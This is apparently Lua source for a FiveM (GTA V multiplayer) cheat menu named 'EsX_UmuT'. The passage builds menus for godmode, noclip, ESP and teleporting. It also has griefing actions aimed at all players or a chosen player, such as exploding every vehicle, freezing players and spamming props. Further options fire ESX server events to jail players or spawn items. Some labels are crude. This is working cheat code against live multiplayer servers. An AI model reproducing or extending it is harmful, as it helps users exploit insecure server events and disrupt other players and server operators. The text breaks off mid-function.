local selectedCustomCrosshair = 1
local _be_aN2 = be_aN2
local customCrosshairOpts = {
    'Off',
    'Default',
    'Custom'
}

Aldoportu.menuTables.customExploitableItems.Item = {
    'Repair Kit', 'Bandage', 'Medkit', 'Bitcoin', 'Gold', 'Jewels', 'Drill', 'Lockpick'
}
Aldoportu.menuTables.customExploitableItems.ItemDatabase = {
    ['Repair Kit']      = oTable.new{ 'Repair Kit', 'fixkit' },
    ['Bandage']      	= oTable.new{ 'Bandage', 'bandage' },
    ['Medkit']      	= oTable.new{ 'Medkit', 'medikit' },
    ['Bitcoin']      	= oTable.new{ 'Bitcoin', 'bitcoin' },
    ['Gold']      		= oTable.new{ 'Gold', 'gold' },
    ['Jewels']      	= oTable.new{ 'Jewels', 'jewels' },
    ['Drill']      		= oTable.new{ 'Drill', 'drill' },
    ['Lockpick']      	= oTable.new{ 'Lockpick', 'lockpick' },
}
Aldoportu.menuTables.customExploitableItems.ItemRequires = {
    ['Repair Kit']      = 'fixkit',
    ['Bandage']      	= 'bandage',
    ['Medkit']      	= 'medikit',
    ['Bitcoin']      	= 'bitcoin',
    ['Gold']      		= 'gold',
    ['Jewels']      	= 'jewels',
    ['Drill']      		= 'drill',
    ['Lockpick']      	= 'lockpick',
}
local currentESXJobPaycheck = 1
local selectedESXJobPaycheck = 1
local currentESXItemSpawn = 1
local selectedESXItemSpawn = 1
local currentESXHarvestItem = 1
local selectedESXHarvestItem = 1
local currentESXCustomItemSpawn = 1
local selectedESXCustomItemSpawn = 1

local availableESXBossMenus = {'Police', 'Ambulance', 'Mechanic', 'Taxi', 'Cardealer', 'Gang', 'RealEstateAgent'}
local currentESXOpenBossMenu = 1
local selectedESXOpenBossMenu = 1

--[[
	Menu settings.
]]

local currentMenuX = 1
local selectedMenuX = 1
local currentMenuY = 4
local selectedMenuY = 4
local menuX = { 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.75 }
local menuY = { 0.025, 0.1, 0.2, 0.3, 0.425 }

local currentMenuOptionsCount = 4
local selectedMenuOptionsCount = 4
local menuOptionsCount = { 5, 10, 11, 12, 13, 14, 15, 20, 25 }

Aldoportu.comboBoxes = {
	[0] = {
		_words = {'Option 1', 'Option 2'},
		_current = 1,
		_selected = 1,
	},
	[1] = {
		_words = {'Lower', 'Raise'},
		_current = 1,
		_selected = 1,
	},
	[2] = {
		_words = {'jester3', 'elegy', 'sultanrs', 'coquette3', 'monster', 'banshee2', 'specter', 'xa21'},
		_current = 1,
		_selected = 1,
	},
	[3] = {
		_words = {'+1%', '+2%', '+4%', '+8%', '+16%', '+32%', '+64%', '+128%', '+256%', '+512%'},
		_actual = {1.0, 2.0, 4.0, 8.0, 16.0, 32.0, 64.0, 128.0, 256.0, 512.0},
		_current = 1,
		_selected = 1,
	},
	[4] = {
		_words = {'Gas Pump', 'Beach Fire', 'Gas Tank', 'UFO', 'Dildo', 'Toilet', 'Missile', 'Couch', 'Banana Party', 'Ramp'},
		_actual = {
			{'prop_gas_pump_1d', 'prop_gas_pump_1b', 'prop_gas_pump_old3', 'prop_gas_pump_1a'}, 
			'prop_beach_fire', 'prop_gas_tank_01a', 'p_spinning_anus_s', 'prop_cs_dildo_01', 'prop_ld_toilet_01', 'prop_ld_bomb_anim', 'prop_ld_farm_couch01', 
			{'p_crahsed_heli_s', 'prop_rock_4_big2', 'prop_beachflag_le'}, 
			{'stt_prop_stunt_track_uturn', 'stt_prop_stunt_track_turnice', 'stt_prop_stunt_track_hill'}
		},
		_current = 1,
		_selected = 1,
	},
}

pCreateThread(function()
	--[[themes]]
	local currentThemeIndex = 3
	local selectedThemeIndex = 3
	
	local currentCheckboxIndex = 1
	local selectedCheckboxIndex = 1

	--[[selfOptions]]
	local FastCB = {1.0, 1.09, 1.19, 1.29, 1.39, 1.49}
	local FastCBWords = {'+0%', '+20%', '+40%', '+60%', '+80%', '+100%'}
	local currentFastRunIndex = 1
    local selectedFastRunIndex = 1
    local currentFastSwimIndex = 1
	local selectedFastSwimIndex = 1

	--[[allPlayersOptions]]
	local pedDensityX = {1.0, 0.8, 0.6, 0.4, 0.2, 0.1, 0.0}
	local pedDensityXCurrent = 1
    local pedDensityXSelectedf = 1
	local pedDensityXWords = {'Default', '-20%', '-40%', '-60%', '-80%', '-100%'}
	local pedDensityXSelected = 1

	--[[selectedPlayerOptions]]
	local sPORamVehicleCurrent = 1
	local sPORamVehicleSelected = 1
	local sPORamVehicleX = 'bus'
	local sPORamVehicleWords = {'bus', 'monster', 'freight', 'bulldozer'}

	--[[vehicleOptions]]
	local vehiclesEnginePowerBoostCurrent = 1
    local vehiclesEnginePowerBoostSelected = 1
	local vehiclesEngineTorqueBoostCurrent = 1
	local vehiclesEngineTorqueBoostSelected = 1
	
	--[[weaponOptions]]
	local weaponOptionsSelected = nil
	local weaponOptionsSelectedWeapon = nil
	local weaponOptionsSelectedMod = nil
	
	Aldoportu.createMenu('Aldoportu', 'EsX_UmuT')
	Aldoportu.setSubTitle('Aldoportu', 'EsX_UmuT Menu')
	Aldoportu.createSubMenu('selfOptions', 'Aldoportu', 'Self Options')
	Aldoportu.createSubMenu('onlinePlayersOptions', 'Aldoportu', 'Online Players')
	Aldoportu.createSubMenu('visualOptions', 'Aldoportu', 'Visual Options')
	Aldoportu.createSubMenu('teleportOptions', 'Aldoportu', 'Teleport Options')
	Aldoportu.createSubMenu('vehicleOptions', 'Aldoportu', 'Vehicle Options')
	Aldoportu.createSubMenu('weaponOptions', 'Aldoportu', 'Weapon Options')
	Aldoportu.createSubMenu('serverOptions', 'Aldoportu', 'Server Options')
	Aldoportu.createSubMenu('menuSettings', 'Aldoportu', 'Menu Options')
	
	Aldoportu.createSubMenu('selfSuperPowers', 'selfOptions', 'Super Powers')
	Aldoportu.createSubMenu('selfClothing', 'selfOptions', 'Clothing')

	Aldoportu.createSubMenu('allPlayersOptions', 'onlinePlayersOptions', 'All Online Players')
	Aldoportu.createSubMenu('allPlayersOptionsTriggers', 'allPlayersOptions', 'All Online Players Triggers')
	Aldoportu.createSubMenu('selectedPlayerOptions', 'onlinePlayersOptions', 'Selected Player Options')
	Aldoportu.createSubMenu('selectedPlayerOptionsTriggers', 'selectedPlayerOptions', 'Selected Player Trigger Options')
	Aldoportu.createSubMenu('selectedPlayerOptionsTroll', 'selectedPlayerOptions', 'Selected Player Troll Options')
	Aldoportu.createSubMenu('selectedPlayerOptionsWeapon', 'selectedPlayerOptions', 'Selected Player Weapon Options')

	Aldoportu.createSubMenu('visualOptionsESP', 'visualOptions', 'Visual ESP Options')

	Aldoportu.createSubMenu('savedVehiclesOptions', 'vehicleOptions', 'Saved Vehicles Options')
	Aldoportu.createSubMenu('selectedSavedVehicleOptions', 'savedVehiclesOptions', 'Slected Saved Vehicle Options')
	Aldoportu.createSubMenu('vehicleLosSantosCustoms', 'vehicleOptions', 'Los Santos Customs')
	Aldoportu.createSubMenu('vehicleLosSantosCustomsCosmetics', 'vehicleLosSantosCustoms', 'Los Santos Customs | Cosmetics')
	Aldoportu.createSubMenu('vehicleLosSantosCustomsPerformance', 'vehicleLosSantosCustoms', 'Los Santos Customs | Performance')

	for i, actual_i in pairs(Aldoportu.menuTables.vehiclePerformanceTable) do
		Aldoportu.createSubMenu('vehicleLosSantosCustomsPerformance'..actual_i.name, 'vehicleLosSantosCustomsPerformance', 'Los Santos Customs | '..actual_i.name)
	end

	Aldoportu.createSubMenu('vehicleSpawnList', 'vehicleOptions', 'Vehicle Spawn Options')
	Aldoportu.createSubMenu('vehicleSpawnSelected', 'vehicleSpawnList', 'Select A Vehicle')
	Aldoportu.createSubMenu('vehicleSpawnSelectedOptions', 'vehicleSpawnSelected', 'Vehicle Spawn Selected')

	Aldoportu.createSubMenu('weaponOptionsModification', 'weaponOptions', 'Weapon Modification')
	Aldoportu.createSubMenu('weaponOptionsTypes', 'weaponOptions', 'Weapon Type Selection')
	Aldoportu.createSubMenu('weaponOptionsTypeSelection', 'weaponOptionsTypes', 'Weapon Selection')
	Aldoportu.createSubMenu('weaponsModOptions', 'weaponOptionsTypeSelection', 'Weapon Options')
	Aldoportu.createSubMenu('weaponsModSelect', 'weaponsModOptions', 'Weapon Mod Options')

	Aldoportu.createSubMenu('serverOptionsResources', 'serverOptions', 'Server Resources')
	Aldoportu.createSubMenu('serverOptionsResourcesSelected', 'serverOptionsResources', 'Selected Resource')
	Aldoportu.createSubMenu('serverOptionsResourcesSelectedCEvents', 'serverOptionsResourcesSelected', 'Selected Resource Client Events')
	Aldoportu.createSubMenu('serverOptionsResourcesSelectedSEvents', 'serverOptionsResourcesSelected', 'Selected Resource Server Events')
	Aldoportu.createSubMenu('serverOptionsTriggerEvents', 'serverOptions', 'Trigger Events')
	Aldoportu.createSubMenu('serverOptionsTriggerEventsESX', 'serverOptionsTriggerEvents', 'ESX Trigger Events')
	Aldoportu.createSubMenu('serverOptionsTriggerEventsVRP', 'serverOptionsTriggerEvents', 'vRP Trigger Events')
	Aldoportu.createSubMenu('serverOptionsTriggerEventsESXMoney', 'serverOptionsTriggerEventsESX', 'ESX Money Options')

	Aldoportu.createSubMenu('credits', 'menuSettings', 'Menu Credits')
	Aldoportu.createSubMenu('keybindSettings', 'menuSettings', 'Keybind Settings')

	Aldoportu.initTheme(1)

	if Aldoportu.functions.doesResourceExist('es_extended') then
		Aldoportu.datastore.ESX = exports['es_extended']:getSharedObject()
	else
		Aldoportu.datastore.ESX = nil
	end

	local introInteger = 0
	while Aldoportu.shouldShowMenu do
		Aldoportu.datastore.pLocalPlayer.cVehicle = GetVehiclePedIsUsing(Aldoportu.datastore.pLocalPlayer.pedId)
		Aldoportu.datastore.pLocalPlayer.pedId = PlayerPedId(-1)

		if introInteger == 0 then
			introScaleform = Aldoportu.trashFunctions.initIntro('mp_big_message_freemode', '~r~EsX_UmuT | Press F3')
			DrawScaleformMovieFullscreen(introScaleform, 80, 80, 80, 80, 0)
			pCreateThread(function()
				while Aldoportu.shouldShowMenu do
					pWait(5000)
					introInteger = introInteger + 1
				end
			end)
		end

		if Aldoportu.isMenuOpened('Aldoportu') then
			if Aldoportu.menuButton('Self Options', 'selfOptions', '', {dict = 'mpleaderboard', text = 'leaderboard_deaths_icon', color = Aldoportu.menuTabsColors.selfOptions}) then
			elseif Aldoportu.menuButton('Online Players', 'onlinePlayersOptions', '', {dict = 'mpleaderboard', text = 'leaderboard_friends_icon', color = Aldoportu.menuTabsColors.onlineOptions}) then
			elseif Aldoportu.menuButton('Visual Options', 'visualOptions', '', {dict = 'mpleaderboard', text = 'leaderboard_bikers_icon', color = Aldoportu.menuTabsColors.visualOptions}) then
			elseif Aldoportu.menuButton('Teleport Options', 'teleportOptions', '', {dict = 'mpleaderboard', text = 'leaderboard_star_icon', color = Aldoportu.menuTabsColors.teleportOptions}) then
			elseif Aldoportu.menuButton('Vehicle Options', 'vehicleOptions', '', {dict = 'mpleaderboard', text = 'leaderboard_steeringwheel_icon', color = Aldoportu.menuTabsColors.vehicleOptions}) then
			elseif Aldoportu.menuButton('Weapon Options', 'weaponOptions', '', {dict = 'mpleaderboard', text = 'leaderboard_kd_icon', color = Aldoportu.menuTabsColors.weaponOptions}) then
			elseif Aldoportu.menuButton('Server Options', 'serverOptions', '', {dict = 'mpleaderboard', text = 'leaderboard_globe_icon', color = Aldoportu.menuTabsColors.serverOptions}) then
			elseif Aldoportu.menuButton('Menu Options', 'menuSettings', '', {dict = 'mpleaderboard', text = 'leaderboard_position_icon', color = Aldoportu.menuTabsColors.menuOptions}) then
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('selfOptions') then
			if Aldoportu.menuButton('Super Powers', 'selfSuperPowers') then
			elseif Aldoportu.menuButton('Clothing', 'selfClothing') then
			elseif Aldoportu.checkBox('Godmode', Aldoportu.storedControls.godmode) then
				Aldoportu.storedControls.godmode = not Aldoportu.storedControls.godmode
			elseif Aldoportu.checkBox('Semi Godmode', Aldoportu.storedControls.semiGodmode) then
				Aldoportu.storedControls.semiGodmode = not Aldoportu.storedControls.semiGodmode
			elseif Aldoportu.checkBox('Infinite Stamina', Aldoportu.storedControls.infStamina) then
				Aldoportu.storedControls.infStamina = not Aldoportu.storedControls.infStamina
			elseif Aldoportu.checkBox('Noclip', Aldoportu.storedControls.noClip) then
				Aldoportu.functions.toggleNoclip()
			elseif Aldoportu.checkBox('No Ragdoll', Aldoportu.storedControls.noRagdoll) then
				Aldoportu.storedControls.noRagdoll = not Aldoportu.storedControls.noRagdoll
			elseif Aldoportu.checkBox('Never Wanted', Aldoportu.storedControls.neverWanted) then
				Aldoportu.storedControls.neverWanted = not Aldoportu.storedControls.neverWanted
			elseif Aldoportu.checkBox('Invisible', Aldoportu.storedControls.invisible) then
				Aldoportu.storedControls.invisible = not Aldoportu.storedControls.invisible
			elseif Aldoportu.button('Revive', 'Native') then
				Aldoportu.functions.nativeRevive()
			elseif Aldoportu.button('Suicide', 'Native') then
				Aldoportu.natives.setEntityHealth(Aldoportu.datastore.pLocalPlayer.pedId, 0)
			elseif Aldoportu.button('Refill Health', 'Native') then
				Aldoportu.natives.setEntityHealth(Aldoportu.datastore.pLocalPlayer.pedId, 200)
				Aldoportu.pushNotification('Health refilled', 5000)
			elseif Aldoportu.button('Refill Armour', 'Native') then
				Aldoportu.natives.setPedArmour(Aldoportu.datastore.pLocalPlayer.pedId, 200)
				Aldoportu.pushNotification('Armour refilled', 5000)
			elseif Aldoportu.button('Refill Stamina', 'Native') then
				ResetPlayerStamina(Aldoportu.datastore.pLocalPlayer.pedId)
			elseif Aldoportu.comboBox('Disappear From Chase', {'In the sky', 'Legion Square', 'Vespucci Beach', 'Sandy Shores', 'Blaine County'}, Aldoportu.storedControls.currentDisappearFromChase, Aldoportu.storedControls.selectedDisappearFromChase, 
				function(currentIndex, selectedIndex)
					Aldoportu.storedControls.currentDisappearFromChase = currentIndex
					Aldoportu.storedControls.selectedDisappearFromChase = currentIndex
				end) then
				Aldoportu.functions.disappearFromChase()
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('selfSuperPowers') then
			if Aldoportu.button('Kill Nearby Peds', 'Native') then
				Aldoportu.functions.killNearbyPeds()
			elseif Aldoportu.checkBox('Super Jump', Aldoportu.storedControls.superJump) then
				Aldoportu.storedControls.superJump = not Aldoportu.storedControls.superJump
			elseif Aldoportu.checkBox('Magneto', Aldoportu.storedControls.magnetoMode) then
				Aldoportu.storedControls.magnetoMode = not Aldoportu.storedControls.magnetoMode
				Aldoportu.functions.magnetoMode()
			elseif Aldoportu.checkBox('Heat Vision', Aldoportu.storedControls.heatVision) then
				Aldoportu.storedControls.heatVision = not Aldoportu.storedControls.heatVision
			elseif Aldoportu.checkBox('Night Vision', Aldoportu.storedControls.nightVision) then
				Aldoportu.storedControls.nightVision = not Aldoportu.storedControls.nightVision
			elseif Aldoportu.checkBox('Become Tiny', Aldoportu.storedControls.tinyPlayer) then
				Aldoportu.storedControls.tinyPlayer = not Aldoportu.storedControls.tinyPlayer
			elseif Aldoportu.checkBox('Become The Flash', Aldoportu.storedControls.flashmanSP) then
				Aldoportu.storedControls.flashmanSP = not Aldoportu.storedControls.flashmanSP
			elseif Aldoportu.comboBoxSlider('Fast Run', FastCBWords, currentFastRunIndex, selectedFastRunIndex, 
				function(currentIndex, selectedIndex)
					currentFastRunIndex = currentIndex
					selectedFastRunIndex = currentIndex
					FastRunMultiplier = FastCB[currentIndex]
					if not Aldoportu.storedControls.flashmanSP then
						SetRunSprintMultiplierForPlayer(PlayerId(), FastRunMultiplier)
					end
				end) then
			elseif Aldoportu.comboBoxSlider('Fast Swim', FastCBWords, currentFastSwimIndex, selectedFastSwimIndex, 
				function(currentIndex, selectedIndex)
					currentFastSwimIndex = currentIndex
					selectedFastSwimIndex = currentIndex
					FastSwimMultiplier = FastCB[currentIndex]
					SetSwimMultiplierForPlayer(PlayerId(), FastSwimMultiplier)
				end) then
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('selfClothing') then
			if Aldoportu.button('Random Outfit', 'Native') then
				Aldoportu.functions.randomClothes(PlayerId())
			elseif Aldoportu.button('Nertigel\'s Outfit', 'Native') then
				Aldoportu.functions.resetAppearance()
				Aldoportu.functions.changeAppearance('HAIR', 32, 0)
				Aldoportu.functions.changeAppearance('HATS', 12, 0)
				Aldoportu.functions.changeAppearance('TORSO', 75, 0)
				Aldoportu.functions.changeAppearance('TORSO2', 20, 2)
				Aldoportu.functions.changeAppearance('LEGS', 20, 2)
				Aldoportu.functions.changeAppearance('HANDS', 0, 0)
				Aldoportu.functions.changeAppearance('GLASSES', 6, 2)
				Aldoportu.functions.changeAppearance('SHOES', 20, 3)
			elseif Aldoportu.button('Balla', 'Native') then
				Aldoportu.functions.resetAppearance()
				Aldoportu.functions.changeAppearance('HATS', 10, 7)
				Aldoportu.functions.changeAppearance('GLASSES', 17, 6)
				Aldoportu.functions.changeAppearance('MASK', 51, 6)
				Aldoportu.functions.changeAppearance('TORSO', 14, 0)
				Aldoportu.functions.changeAppearance('LEGS', 5, 9)
				Aldoportu.functions.changeAppearance('SHOES', 9, 5)
				Aldoportu.functions.changeAppearance('SPECIAL2', 23, 0)
				Aldoportu.functions.changeAppearance('TORSO2', 7, 9)
			elseif Aldoportu.button('SWAT', 'Native') then
				Aldoportu.functions.resetAppearance()
				Aldoportu.functions.changeAppearance('TORSO', 17, 0)
				Aldoportu.functions.changeAppearance('MASK', 56, 1)
				Aldoportu.functions.changeAppearance('HATS', 40, 0)
				Aldoportu.functions.changeAppearance('HAIR', 0, 0)
				Aldoportu.functions.changeAppearance('TORSO', 19, 0)
				Aldoportu.functions.changeAppearance('GLASSES', 0, 1)
				Aldoportu.functions.changeAppearance('LEGS', 34, 0)
				Aldoportu.functions.changeAppearance('SHOES', 25, 0)
				Aldoportu.functions.changeAppearance('SPECIAL', 0, 0)
				Aldoportu.functions.changeAppearance('SPECIAL2', 58, 0)
				Aldoportu.functions.changeAppearance('SPECIAL3', 4, 1)
				Aldoportu.functions.changeAppearance('TORSO2', 55, 0)
				Aldoportu.functions.changeAppearance('HANDS', 0, 0)
			elseif Aldoportu.button('Ghost', 'Native') then
				Aldoportu.functions.resetAppearance()
				Aldoportu.functions.changeAppearance('TORSO', 17, 0)
				Aldoportu.functions.changeAppearance('MASK', 29, 0)
				Aldoportu.functions.changeAppearance('HATS', 28, 0)
				Aldoportu.functions.changeAppearance('HAIR', 0, 0)
				Aldoportu.functions.changeAppearance('GLASSES', 0, 1)
				Aldoportu.functions.changeAppearance('LEGS', 31, 0)
				Aldoportu.functions.changeAppearance('SHOES', 24, 0)
				Aldoportu.functions.changeAppearance('SPECIAL', 30, 2)
				Aldoportu.functions.changeAppearance('SPECIAL2', 15, 0)
				Aldoportu.functions.changeAppearance('TORSO2', 50, 0)
				Aldoportu.functions.changeAppearance('HANDS', 0, 0)
			elseif Aldoportu.button('Elf', 'Native') then
				Aldoportu.functions.resetAppearance()
				Aldoportu.functions.changeAppearance('MASK', 34, 0)
				Aldoportu.functions.changeAppearance('TORSO', 4, 0)
				Aldoportu.functions.changeAppearance('LEGS', 19, 1)
				Aldoportu.functions.changeAppearance('SHOES', 22, 1)
				Aldoportu.functions.changeAppearance('SPECIAL1', 18, 0)
				Aldoportu.functions.changeAppearance('SPECIAL2', 28, 8)
				Aldoportu.functions.changeAppearance('TORSO2', 19, 1)
			elseif Aldoportu.button('Thug', 'Native') then
				Aldoportu.functions.resetAppearance()
				Aldoportu.functions.changeAppearance('HATS', 46, 1)
				Aldoportu.functions.changeAppearance('GLASSES', 17, 6)
				Aldoportu.functions.changeAppearance('MASK', 51, 7)
				Aldoportu.functions.changeAppearance('TORSO', 22, 0)
				Aldoportu.functions.changeAppearance('LEGS', 7, 0)
				Aldoportu.functions.changeAppearance('HANDS', 44, 0)
				Aldoportu.functions.changeAppearance('SHOES', 12, 6)
				Aldoportu.functions.changeAppearance('SPECIAL2', 15, 0)
				Aldoportu.functions.changeAppearance('TORSO2', 14, 7)
			elseif Aldoportu.button('Santa Claus', 'Native') then
				Aldoportu.functions.resetAppearance()
				Aldoportu.functions.changeAppearance('MASK', 8, 0)
				Aldoportu.functions.changeAppearance('TORSO', 12, 0)
				Aldoportu.functions.changeAppearance('LEGS', 19, 0)
				Aldoportu.functions.changeAppearance('SHOES', 4, 4)
				Aldoportu.functions.changeAppearance('SPECIAL1', 10, 0)
				Aldoportu.functions.changeAppearance('SPECIAL2', 21, 2)
				Aldoportu.functions.changeAppearance('TORSO2', 19, 0)
			elseif Aldoportu.button('Penguin', 'Native') then
				Aldoportu.functions.resetAppearance()
				Aldoportu.functions.changeAppearance('TORSO', 0, 0)
				Aldoportu.functions.changeAppearance('MASK', 31, 0)
				Aldoportu.functions.changeAppearance('HATS', 0, 0)
				Aldoportu.functions.changeAppearance('HAIR', 0, 0)
				Aldoportu.functions.changeAppearance('GLASSES', 0, 0)
				Aldoportu.functions.changeAppearance('LEGS', 32, 0)
				Aldoportu.functions.changeAppearance('SHOES', 17, 0)
				Aldoportu.functions.changeAppearance('SPECIAL1', 0, 0)
				Aldoportu.functions.changeAppearance('SPECIAL2', 57, 0)
				--[[Aldoportu.functions.changeAppearance('SPECIAL3', 0, 0)]]
				Aldoportu.functions.changeAppearance('TEXTURES', 0, 0)
				Aldoportu.functions.changeAppearance('TORSO2', 51, 0)
				Aldoportu.functions.changeAppearance('HANDS', 0, 0)
			elseif Aldoportu.button('Soldier', 'Native') then
				Aldoportu.functions.resetAppearance()
				Aldoportu.functions.changeAppearance('TORSO', 96, 0)
				Aldoportu.functions.changeAppearance('HATS', 40, 0)
				Aldoportu.functions.changeAppearance('MASK', 54, 0)
				Aldoportu.functions.changeAppearance('GLASSES', 0, 1)
				Aldoportu.functions.changeAppearance('LEGS', 34, 0)
				Aldoportu.functions.changeAppearance('SHOES', 25, 0)
				Aldoportu.functions.changeAppearance('SPECIAL1', 0, 0)
				Aldoportu.functions.changeAppearance('SPECIAL2', 15, 0)
				Aldoportu.functions.changeAppearance('TORSO2', 53, 0)
				Aldoportu.functions.changeAppearance('HANDS', 51, 0)
			elseif Aldoportu.button('Soldier 2', 'Native') then
				Aldoportu.functions.resetAppearance()
				Aldoportu.functions.changeAppearance('HATS', 40, 0)
				Aldoportu.functions.changeAppearance('MASK', 28, 0)
				Aldoportu.functions.changeAppearance('TORSO', 44, 0)
				Aldoportu.functions.changeAppearance('LEGS', 34, 0)
				Aldoportu.functions.changeAppearance('HANDS', 45, 0)
				Aldoportu.functions.changeAppearance('SHOES', 25, 0)
				Aldoportu.functions.changeAppearance('SPECIAL2', 56, 1)
				Aldoportu.functions.changeAppearance('TORSO2', 53, 0)
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('onlinePlayersOptions') then
			Aldoportu.setSubTitle('onlinePlayersOptions', #Aldoportu.natives.getActivePlayers()..' Player(s) Online')
			if Aldoportu.menuButton('All Players / World', 'allPlayersOptions') then
			else
				local playerlist = Aldoportu.natives.getActivePlayers()
				for i = 1, #playerlist do
					local currentPlayer = playerlist[i]
					
					if Aldoportu.menuButton('~b~[C:'..currentPlayer..' | S:'..GetPlayerServerId(currentPlayer)..']~m~ '..GetPlayerName(currentPlayer)..Aldoportu.trashFunctions.getPlayerStatus(GetPlayerPed(currentPlayer)), 'selectedPlayerOptions') then
						selectedPlayer = currentPlayer 
					end
				end
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('allPlayersOptions') then
			if Aldoportu.menuButton('Trigger Events', 'allPlayersOptionsTriggers') then
			elseif Aldoportu.button('Give Everyone Weapons', 'Native') then
				Aldoportu.functions.aPO.giveAllWeapons(false)
			elseif Aldoportu.button('Give Everyone Weapons As Pickups', 'Native') then
				Aldoportu.functions.aPO.giveAllWeapons(true)
			elseif Aldoportu.button('Rape Vehicles', 'Native') then
				Aldoportu.functions.aPO.rapeVehicles()
			elseif Aldoportu.button('Explode Vehicles', 'Native') then
				Aldoportu.functions.aPO.explodeCars()
			elseif Aldoportu.button('Clone Peds', 'Native') then
				Aldoportu.functions.aPO.clonePeds()
			elseif Aldoportu.button('Burn Effect', 'Native') then
				Aldoportu.functions.aPO.burnSFX()
			elseif Aldoportu.comboBox('Spawn Props', Aldoportu.comboBoxes[4]._words, Aldoportu.comboBoxes[4]._current, Aldoportu.comboBoxes[4]._selected, 
				function(currentIndex, selectedIndex)
					Aldoportu.comboBoxes[4]._current = currentIndex
					Aldoportu.comboBoxes[4]._selected = currentIndex
				end) then
					if type(Aldoportu.comboBoxes[4]._actual[Aldoportu.comboBoxes[4]._selected]) == 'table' then
						for key, value in pairs(Aldoportu.comboBoxes[4]._actual[Aldoportu.comboBoxes[4]._selected]) do
							Aldoportu.functions.aPO.spawnTrollProp(Aldoportu.comboBoxes[4]._actual[Aldoportu.comboBoxes[4]._selected][key])
						end
					else
						Aldoportu.functions.aPO.spawnTrollProp(Aldoportu.comboBoxes[4]._actual[Aldoportu.comboBoxes[4]._selected])
					end
			elseif Aldoportu.comboBox('Prop Block', Aldoportu.menuTables.trollsPropBlock.words, Aldoportu.menuTables.trollsPropBlock.current, Aldoportu.menuTables.trollsPropBlock.selected, 
				function(currentIndex, selectedIndex)
					Aldoportu.menuTables.trollsPropBlock.current = currentIndex
					Aldoportu.menuTables.trollsPropBlock.selected = currentIndex
				end)
				then
					Aldoportu.functions.aPO.propBlock(Aldoportu.menuTables.trollsPropBlock.selected)
			elseif Aldoportu.checkBox('Flying Cars', Aldoportu.storedControls.aPOFlyingCars) then
				Aldoportu.storedControls.aPOFlyingCars = not Aldoportu.storedControls.aPOFlyingCars
			elseif Aldoportu.checkBox('Freeze', Aldoportu.storedControls.aPOFreeze) then
				Aldoportu.storedControls.aPOFreeze = not Aldoportu.storedControls.aPOFreeze
			elseif Aldoportu.checkBox('Disable Driving Vehicles', Aldoportu.storedControls.aPODisableDrivingCars) then
				Aldoportu.storedControls.aPODisableDrivingCars = not Aldoportu.storedControls.aPODisableDrivingCars
			elseif Aldoportu.checkBox('Noisy Vehicles', Aldoportu.storedControls.aPONoisyVehs) then
				Aldoportu.storedControls.aPONoisyVehs = not Aldoportu.storedControls.aPONoisyVehs
			elseif Aldoportu.button('Run Everything ~r~(!)', 'Native') then
				pCreateThread(function()
					Aldoportu.functions.aPO.rapeVehicles()
					pWait(500)
					Aldoportu.functions.aPO.explodeCars()
					pWait(500)
					Aldoportu.functions.aPO.clonePeds()
					pWait(500)
					Aldoportu.functions.aPO.burnSFX()
					pWait(500)
					Aldoportu.functions.aPO.flyingCars()
					for key, value in pairs(Aldoportu.comboBoxes[4]._actual) do
						if type(value) ~= 'table' then
							Aldoportu.functions.aPO.spawnTrollProp(v)
						end
						Wait(500)
					end
				end)
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('allPlayersOptionsTriggers') then
			if Aldoportu.button('Jail', 'ESX | Server') then
				Aldoportu.functions.aPO.jail()
			elseif Aldoportu.button('Un-Jail', 'ESX | Server') then
				Aldoportu.functions.aPO.unJail()
			elseif Aldoportu.button('Community Service', 'ESX | Server') then
				Aldoportu.functions.aPO.communityService()
			elseif Aldoportu.button('Spawn Owned Vehicles', 'ESX | Server') then
				for yeet=0, #Aldoportu.natives.getActivePlayers() do
					Aldoportu.functions.sPO.SpawnLegalVehicle('blista', yeet, Aldoportu.trashFunctions.getRandomLetter(3) .. ' ' .. Aldoportu.trashFunctions.getRandomNumber(4))
				end
			end
			
			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('selectedPlayerOptions') then
			Aldoportu.setSubTitle('selectedPlayerOptions', '~b~['..GetPlayerServerId(selectedPlayer)..']~m~ '..GetPlayerName(selectedPlayer)..Aldoportu.trashFunctions.getPlayerStatus(GetPlayerPed(currentPlayer)))
			if Aldoportu.menuButton('Weapon Options', 'selectedPlayerOptionsWeapon') then
			elseif Aldoportu.menuButton('Troll Options', 'selectedPlayerOptionsTroll') then
			elseif Aldoportu.menuButton('Trigger Options', 'selectedPlayerOptionsTriggers') then
			elseif Aldoportu.button('Spectate', Aldoportu.storedControls.sPOIsSpectating and 'Spectating: ['..GetPlayerServerId(Aldoportu.storedControls.spectatedPlayer)..']' or 'Spectating: [-1]') then
				Aldoportu.storedControls.spectatedPlayer = selectedPlayer
				Aldoportu.functions.sPO.spectatePlayer(Aldoportu.storedControls.spectatedPlayer)
			elseif Aldoportu.button('Give Health', 'Native') then
				Aldoportu.natives.setEntityHealth(GetPlayerPed(selectedPlayer), 200)
				CreatePickup(GetHashKey('PICKUP_HEALTH_STANDARD'), GetEntityCoords(GetPlayerPed(selectedPlayer)))
			elseif Aldoportu.button('Give Armour', 'Native') then
				Aldoportu.natives.setPedArmour(GetPlayerPed(selectedPlayer), 200)
				CreatePickup(GetHashKey('PICKUP_ARMOUR_STANDARD'), GetEntityCoords(GetPlayerPed(selectedPlayer)))
			elseif Aldoportu.button('Teleport To', 'Native') then
				Aldoportu.functions.sPO.teleportToPlayer(selectedPlayer)
			elseif Aldoportu.button('Teleport Into Vehicle', 'Native') then
				Aldoportu.functions.sPO.teleportIntoVehicle(GetPlayerPed(selectedPlayer))
			elseif Aldoportu.button('Clone Vehicle', 'Native') then
				Aldoportu.functions.sPO.cloneVehicle(selectedPlayer)
			elseif Aldoportu.button('Clone Outfit', 'Native') then
				Aldoportu.functions.sPO.clonePedOutfit(Aldoportu.datastore.pLocalPlayer.pedId, GetPlayerPed(selectedPlayer))
			end

			Aldoportu.runDrawMenu()
		elseif Aldoportu.isMenuOpened('selectedPlayerOptionsWeapon') then
			if Aldoportu.checkBox('Spawn As Pickup', Aldoportu.storedControls.weapSpawnAsPickup) then
